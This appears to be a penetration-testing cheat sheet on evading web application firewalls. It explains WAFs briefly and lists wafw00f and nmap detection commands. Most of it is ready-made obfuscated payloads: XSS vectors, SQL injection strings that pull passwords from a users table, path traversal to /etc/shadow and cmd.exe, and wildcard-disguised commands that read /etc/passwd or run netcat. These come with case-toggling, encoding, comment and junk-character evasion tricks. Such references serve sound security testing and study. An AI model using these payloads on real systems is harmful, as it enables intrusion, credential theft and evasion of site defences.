# WAF Bypass

## Brief

{% hint style="info" %}
A **WAF** or web application firewall helps protect web applications by **filtering** and **monitoring** HTTP traffic between a web application and the Internet.

It typically protects web applications from attacks such as **cross-site forgery**, cross-site-scripting (**XSS**), **file inclusion**, and **SQL injection**, among others.

A WAF is a protocol **layer 7** defense (in the OSI model), and is not designed to defend against all types of attacks. This method of attack mitigation is usually part of a suite of tools which together create a holistic defense against a range of attack vectors.
{% endhint %}

![Popular WAF vendors](<../.gitbook/assets/image (60).png>)

## Identify the WAF

WAFs use standard ports : **80**, **443**, **8000**, **8008**, **8080**, and **8088**.

{% tabs %}
{% tab title="wafw00f" %}
```bash
wafw00f $target
```
{% endtab %}

{% tab title="nmap" %}
```bash
# detecting the waf
nmap -p$port --script http-waf-detect $target

# fingerprinting the waf
nmap -p$port --script http-waf-fingerprint $target
```
{% endtab %}
{% endtabs %}

## Bypass techniques

### Case Toggling

{% hint style="info" %}
Combine **upper** and **lower case characters** for creating great payloads.
{% endhint %}

#### **Examples**

```
# bypassed 
<ScrIpT>confirm()</sCRiPt>
sELeCt * fRoM * wHerE OWNER = 'NAME_OF_DB'

# url example
http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4
```

### **URL Encoding**

{% hint style="info" %}
* **Encode** normal payloads with **%** encoding/URL encoding.
* You can use **Burp**. It has an encoder/decoder tool.
{% endhint %}

#### Examples

```javascript
# blocked by waf
<Svg/x=">"/OnLoAD=confirm()//
# bypassed
%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F

# blocked by waf
UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)
# bypassed
UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29

# url example
https://example.com/page.php?id=1%252f%252a*/UNION%252f%252a /SELECT
```

### Unicode

{% hint style="info" %}
* **ASCII** characters in Unicode encoding give us great variants for bypassing WAF.
* **Encode entire or part** of the payload for obtaining results.
{% endhint %}

#### Examples

```
# basic request
<marquee onstart=prompt()>

# obfuscated
<marquee onstart=\u0070r\u06f\u006dpt()>

# blocked by waf
/?redir=http://google.com

# bypassed
/?redir=http://google。com (Unicode alternative)

# blocked by waf
<marquee loop=1 onfinish=alert()>x

# bypassed
＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative)

# basic request
../../etc/shadow

# obfuscated
%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow
```

### HTML Representation

{% hint style="info" %}
* WebApps encode special characters into HTML. Encoding and render them accordingly.
* Basic bypass cases with HTML encoding numeric and generic.
{% endhint %}

#### Examples

```
# basic request
"><img src=x onerror=confirm()>

# encoded payload
&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt; 
# or
&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62; 
```

### Mixed Encoding

{% hint style="info" %}
* Such rules often tend to filter out a specific type of encoding.
* Such filters can be bypassed by **mixed encoding** payloads.
* Newlines and tabs and further add to obfuscation.
{% endhint %}

#### Examples

```
# obfuscated payload
<A HREF="h
tt p://6 6.000146.0x7.147/">XSS</A>
```

### Using comments

{% hint style="info" %}
* Comments obfuscate standard payload vectors.
* Different payloads have different ways of obfuscation.
{% endhint %}

#### Examples

```
# blocked by waf
<script>confirm()</script>

# bypassed
<!--><script>confirm/**/()/**/</script>

# blocked by waf
/?id=1+union+select+1,2--

# bypassed
/?id=1+un/**/ion+sel/**/ect+1,2--

# url example
index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4'union%a0select pass from users#

index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3
```

### Double Encoding

{% hint style="info" %}
* Web Application Firewall filters tend to encode characters to protect web app.
* Poorly developed filters (without recursion filters) can be bypassed with double encoding.
{% endhint %}

```
# basic request
http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

# obfuscated payload
http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

# basic payload
<script>confirm()</script>

# obfuscated payload
%253Cscript%253Econfirm()%253C%252Fscript%253E
```

### Wildcard Obfuscation

{% hint style="info" %}
* Global patterns are used by various command-line utilities to work with multiple files.
* We can change them to run system commands.
{% endhint %}

#### Examples

```
# basic request
/bin/cat /etc/passwd

# obfuscated payload
/???/??t /???/??ss??

# used chars
/ ? t s

# basic request
/bin/nc 127.0.0.1 443

# obfuscated payload
/???/n? 2130706433 443

# used chars
/ ? n [0-9]
```

### Junk Characters

{% hint style="info" %}
* Simple payloads get filtered out easily by WAF.
* Adding some **junk** chars helps **avoid detection** (only specific cases ).
* This technique often helps in confusing regex-based firewalls.
{% endhint %}

#### Examples

```
# basic request
<script>confirm()</script>

# obfuscated payload
<script>+-+-1-+-+confirm()</script>

# basic request
<BODY onload=confirm()>

# obfuscated payload
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>

# basic request
<a href=javascript;alert()>ClickMe

# bypassed technique
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
```

## More

{% embed url="https://hacken.io/researches-and-investigations/how-to-bypass-waf-hackenproof-cheat-sheet" %}
More | WAF Bypass Techniques
{% endembed %}

{% embed url="https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c" %}
PortSwigger | WAF Bypass with BApp
{% endembed %}

{% embed url="https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/" %}
YesWeHack | WAF Bypass
{% endembed %}
